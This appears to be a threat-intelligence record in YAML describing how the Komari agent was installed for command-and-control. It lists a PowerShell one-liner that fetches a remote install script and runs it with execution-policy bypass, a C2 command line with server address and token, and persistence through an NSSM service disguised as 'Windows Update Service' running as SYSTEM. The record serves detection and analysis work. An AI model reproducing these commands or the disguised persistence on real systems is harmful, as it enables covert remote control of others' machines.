title: Komari Agent Installation and C2 Communication
description: A PowerShell one-liner installed Komari agent from GitHub, establishing
  a SYSTEM-level service for persistent C2 communication.
attribution: ''
malware_families:
- Komari
cves: []
ttps:
  processes:
  - cmd.exe
  - powershell.exe
  - komari-agent.exe
  - nssm.exe
  - wininit.exe
  - services.exe
  command_lines:
  - powershell.exe -ExecutionPolicy Bypass -File C:\Users\[User 1]\AppData\Local\Temp\102184ef-a26d-4fb6-4bff-d4e4bd5e8de0.ps1
  - e http://172.16.57.149:25774 -t DzX7Dkdg3ktERvbLOmbe5e
  - komari-agent.exe (SYSTEM)
  - powershell.exe ...\Temp\102184ef-...ps1 (uploadBasicInfo)
  powershell:
  - '{[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
    iwr hxxps://raw.githubusercontent.com/komari-monitor/komari-agent/master/install.ps1
    -OutFile C:\Users\[User 1]\AppData\Local\Temp\install.ps1; powershell.exe -ExecutionPolicy
    Bypass -File C:\Users\[User 1]\AppData\Local\Temp\install.ps1}'
  scripts: []
  registry_keys:
  - HKLM\SYSTEM\CurrentControlSet\Services\Windows Update Service
  - HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters
  image_loads: []
  network_connections:
  - komari-agent.exe -> raw.githubusercontent.com:443
  - komari-agent.exe -> ws(s)://<server>/api/clients/report?token=<token>
  - komari-agent.exe -> 172.16.57.149:25774
  file_activity:
  - C:\Users\[User 1]\AppData\Local\Temp\102184ef-a26d-4fb6-4bff-d4e4bd5e8de0.ps1
  persistence:
  - NSSM-managed service named Windows Update Service pointing to komari-agent.exe
  - nssm registered "Windows Update Service" pointing to komari-agent.exe with specific
    parameters
  process_relations:
  - nssm -> komari-agent.exe
  - wininit.exe -> services.exe (SYSTEM)
  - services.exe (SYSTEM) -> nssm.exe
  - nssm.exe -> komari-agent.exe (SYSTEM)
